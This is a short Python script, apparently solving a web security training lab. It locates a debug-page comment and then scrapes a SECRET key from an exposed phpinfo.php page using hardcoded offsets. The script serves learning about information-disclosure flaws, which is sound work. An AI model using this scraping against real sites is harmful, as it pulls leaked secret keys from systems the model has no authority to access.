import requests

'''

Coded by Kamran Saifullah
https://linkedin.com/in/KamranSaifullah
https://twitter.com/deFr0ggy
https://github.com/deFr0ggy

'''

proxxy = {

    "http" : "https://127.0.0.1:8080",
    "https" : "https://127.0.0.1:8080"

}

URL = "https://0ab400d904a0376181d83fbb00ed0053.web-security-academy.net"
r = requests.get(URL, verify=True)

try:
    if r.status_code == 200:
        
        # Part 1 to Find the Debug Page

        print(f"[+] URL is accessible: {URL}")
        print(f"[+] Debug Page - Source Code at Offset: {r.text.find('<!--')}")
        print(f"[+] Debug PATH: {r.text[10640:10640+49]}")
        
        # Part 2 to find the Secret Key

        URL1 = "https://0ab400d904a0376181d83fbb00ed0053.web-security-academy.net/cgi-bin/phpinfo.php"
        r = requests.get(URL1)
        
        if r.status_code == 200: 
            print(f"[+] URL Working: {URL1}")
            print(f"[+] SECRET Observed at Offset: {r.text.find('SECRET')}")
            print(f"[-] Lab Completed : {r.text[53387:53387+68]}")

        else:
            print("Something Went Wrong")

except:
    print("Something went wrong!")

